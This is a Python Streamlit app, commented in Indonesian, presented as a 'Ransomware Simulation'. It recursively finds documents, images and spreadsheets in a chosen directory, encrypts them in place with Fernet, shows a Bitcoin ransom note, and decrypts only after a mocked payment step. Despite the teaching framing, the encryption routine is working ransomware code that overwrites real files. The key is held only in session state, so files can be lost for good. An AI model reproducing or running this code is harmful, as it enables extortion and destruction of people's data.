import os
import streamlit as st
from cryptography.fernet import Fernet

# Fungsi untuk mencari file dengan ekstensi tertentu
def find_files(directory, extensions):
    files = []
    for root, dirs, files_in_dir in os.walk(directory):
        for file in files_in_dir:
            if any(file.endswith(ext) for ext in extensions):
                files.append(os.path.join(root, file))
    return files

# Fungsi untuk mengenkripsi file
def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        data = file.read()
    encrypted_data = Fernet(key).encrypt(data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

# Fungsi untuk mendekripsi file
def decrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()
    decrypted_data = Fernet(key).decrypt(encrypted_data)
    with open(file_path, 'wb') as file:
        file.write(decrypted_data)

# Fungsi untuk menyimpan kunci enkripsi ke dalam file
def save_key_to_file(key):
    key_folder = 'key'
    os.makedirs(key_folder, exist_ok=True)
    with open(os.path.join(key_folder, 'encryption_key.txt'), 'wb') as key_file:
        key_file.write(key)

# Fungsi untuk menampilkan catatan tebusan
def display_ransom_note():
    ransom_note = """
    Your files have been encrypted!
    To decrypt your files, send 1 Bitcoin to the following address:
    [Bitcoin Address]
    """
    st.text_area("Ransom Note", ransom_note, height=200)

# Fungsi utama untuk halaman enkripsi dan dekripsi
def ransomware_page():
    st.title("Ransomware Simulation")

    # Langkah 1: Infeksi Awal (Dianggap sudah terjadi)
    st.write("Ransomware executed...")

    # Langkah 2: Eksplorasi Sistem
    directory = st.text_input("Enter the directory to encrypt/decrypt:", value='data/')
    extensions = st.multiselect("Select file extensions to encrypt/decrypt:", ['.png', '.csv', '.docx', '.xlsx', '.csv', '.jpg', '.pdf', '.txt'], default=['.png', '.csv' ,'.docx', '.xlsx', '.jpg', '.pdf', '.txt'])
    
    action = st.selectbox("Select action:", ["Encrypt Files", "Decrypt Files"])

    if action == "Encrypt Files":
        if st.button("Start Encryption"):
            files_to_encrypt = find_files(directory, extensions)

            # Langkah 3: Enkripsi File
            if files_to_encrypt:
                key = Fernet.generate_key()
                st.session_state.encryption_key = key
                for file_path in files_to_encrypt:
                    encrypt_file(file_path, key)
                st.success("Files encrypted successfully!")
                display_ransom_note()
            else:
                st.warning("No files found to encrypt.")
    elif action == "Decrypt Files":
        if "encryption_key" not in st.session_state:
            st.warning("No encryption key found. Please encrypt files first.")
        else:
            payment_status = st.selectbox("Payment received?", ["No", "Yes"])
            if payment_status == 'Yes':
                # Simulasikan hacker memberikan kunci dalam file .txt
                save_key_to_file(st.session_state.encryption_key)
                st.success("Payment confirmed. The decryption key has been saved in the 'key' folder.")
                
                key = st.text_input("Enter the decryption key provided by the hacker:")
                if st.button("Start Decryption"):
                    if key.encode() == st.session_state.encryption_key:
                        files_to_decrypt = find_files(directory, extensions)

                        if files_to_decrypt:
                            for file_path in files_to_decrypt:
                                decrypt_file(file_path, key.encode())
                            st.success("Files decrypted successfully!")
                        else:
                            st.warning("No files found to decrypt.")
                    else:
                        st.error("Invalid decryption key.")
            else:
                st.warning("No decryption key sent. Payment is required.")

# Menjalankan halaman ransomware
ransomware_page()